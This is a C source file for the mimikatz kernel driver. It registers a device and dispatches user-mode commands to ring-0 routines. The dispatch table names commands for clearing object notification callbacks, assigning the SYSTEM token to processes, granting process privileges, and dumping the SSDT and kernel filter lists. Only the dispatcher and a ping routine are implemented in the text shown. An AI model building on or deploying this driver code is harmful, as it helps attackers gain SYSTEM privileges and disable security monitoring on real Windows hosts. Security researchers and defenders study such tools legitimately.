#include "mimikatz.h"

ptrLocalFunction maFunc = NULL;

NTSTATUS UnSupported(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	return STATUS_NOT_SUPPORTED;
}

NTSTATUS Write(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	NTSTATUS status = STATUS_INVALID_PARAMETER;
	PIO_STACK_LOCATION pIoStackIrp = NULL;
	PWSTR params;
	size_t tailleParams;

	pIoStackIrp = IoGetCurrentIrpStackLocation(Irp);
	if(Irp->AssociatedIrp.SystemBuffer && pIoStackIrp)
	{
		status = getLocalFuncFromName((LPWSTR) Irp->AssociatedIrp.SystemBuffer, pIoStackIrp->Parameters.Write.Length, &params, &tailleParams, &maFunc);
		
		if(NT_SUCCESS(status))
		{
			Irp->IoStatus.Information = pIoStackIrp->Parameters.Write.Length;
		}
	}
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	Irp->IoStatus.Status = status;
	
	return status;
}

NTSTATUS Read(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	NTSTATUS status = STATUS_INVALID_HANDLE;
	PIO_STACK_LOCATION pIoStackIrp = NULL;

	LPWSTR pszDestEnd;
	size_t pcbRemaining;

	pIoStackIrp = IoGetCurrentIrpStackLocation(Irp);
	if(Irp->AssociatedIrp.SystemBuffer && pIoStackIrp)
	{
		if(maFunc)
		{
			status = maFunc((LPWSTR) Irp->AssociatedIrp.SystemBuffer, pIoStackIrp->Parameters.Read.Length, &pszDestEnd, &pcbRemaining);
			
			if(NT_SUCCESS(status))
			{
				Irp->IoStatus.Information = pIoStackIrp->Parameters.Read.Length - pcbRemaining;
			}
		}
		else
		{
			status = STATUS_PROCEDURE_NOT_FOUND;
		}
	}
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	Irp->IoStatus.Status = status;

	return status;
}

void DriverUnload(IN PDRIVER_OBJECT theDriverObject)
{
	UNICODE_STRING UStrDosDeviceName;
	RtlInitUnicodeString(&UStrDosDeviceName, L"\\DosDevices\\mimikatz");
	IoDeleteSymbolicLink(&UStrDosDeviceName);
	IoDeleteDevice(theDriverObject->DeviceObject);
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath)
{
	NTSTATUS status;
	UNICODE_STRING UStrDriverName, UStrDosDeviceName;
	PDEVICE_OBJECT pDeviceObject = NULL;
	ULONG i;
	
	moi = theDriverObject;
	RtlInitUnicodeString(&UStrDriverName, L"\\Device\\mimikatz");
	status = IoCreateDevice(theDriverObject, 0, &UStrDriverName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &pDeviceObject);
	
	if(NT_SUCCESS(status))
	{
		INDEX_OS = getWindowsIndex();
		
		for(i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
			theDriverObject->MajorFunction[i] = UnSupported;
	
		theDriverObject->MajorFunction[IRP_MJ_READ]		= Read;
		theDriverObject->MajorFunction[IRP_MJ_WRITE]	= Write;
	
		theDriverObject->DriverUnload = DriverUnload;
		
		pDeviceObject->Flags |= DO_BUFFERED_IO;
		pDeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;

		RtlInitUnicodeString(&UStrDosDeviceName, L"\\DosDevices\\mimikatz"); 
		IoCreateSymbolicLink(&UStrDosDeviceName, &UStrDriverName);
	}
	
	return status;
}


ULONG getWindowsIndex()
{
	switch(*NtBuildNumber)
	{
		case 2600:
			return INDEX_XP;
			break;
		case 3790:	
			return INDEX_2K3;
			break;
		case 6000:
		case 6001:
			return INDEX_VISTA;
		case 6002:
			return INDEX_2K8;
			break;
		case 7600:
		case 7601:
			return INDEX_7;
			break;
		case 8102:
		case 8250:
		case 9200:
			return INDEX_8;
			break;
		default:
			return 0;
	}
}

NTSTATUS getLocalFuncFromName(PWSTR buffer, size_t taille, PWSTR *params, size_t * tailleParams, ptrLocalFunction * destFunc)
{
	NTSTATUS status;
	size_t tailleChaine;
	ULONG i;
	ULONG taillFunc;
	
	status = RtlStringCbLengthW(buffer, taille, &tailleChaine);
	if(NT_SUCCESS(status))
	{
		for(i = 0; (i < tailleChaine / sizeof(WCHAR)) && (buffer[i] != L' '); i++);

		if( (i+1) < (tailleChaine / sizeof(WCHAR)))
		{
			*params = buffer + (i+1);
			*tailleParams = (tailleChaine / sizeof(WCHAR)) - (i+1); // avoir !!!
			DbgPrint("%u", *tailleParams);
		}
		else
		{
			*params = NULL;
			*tailleParams = 0;
		}
		
		*destFunc = NULL;
		taillFunc = i*sizeof(WCHAR);
		
		
		KIWI_NameToFunc(L"ping", kPing);
		
		if(INDEX_OS)
		{
			KIWI_NameToFunc(L"ssdt", kSSDT);
		
			KIWI_NameToFunc(L"listModules", kModulesList);
			KIWI_NameToFunc(L"listFilters", kFiltersList);
			KIWI_NameToFunc(L"listMinifilters", kMiniFiltersList);
			
			KIWI_NameToFunc(L"listNotifProcesses", kListNotifyProcesses);
			KIWI_NameToFunc(L"listNotifThreads", kListNotifyThreads);
			KIWI_NameToFunc(L"listNotifImages", kListNotifyImages);
			KIWI_NameToFunc(L"listNotifRegistry", kListNotifyRegistry);
			KIWI_NameToFunc(L"listNotifObjects", kListNotifyObjects);
			KIWI_NameToFunc(L"clearNotifObjects", kClearNotifyObjects);
			
			KIWI_NameToFunc(L"listProcesses", listProcesses);
			KIWI_NameToFunc(L"sysToken", sysToken);
			KIWI_NameToFunc(L"privProcesses", privProcesses);
		}
	}
	return status;
}


NTSTATUS kPing(LPWSTR pszDest, size_t cbDest, LPWSTR *ppszDestEnd, size_t *pcbRemaining)
{
	return  RtlStringCbPrintfExW(pszDest, cbDest, ppszDestEnd, pcbRemaining, STRSAFE_NO_TRUNCATION, L"Pong (from ring 0 :)\n");
}
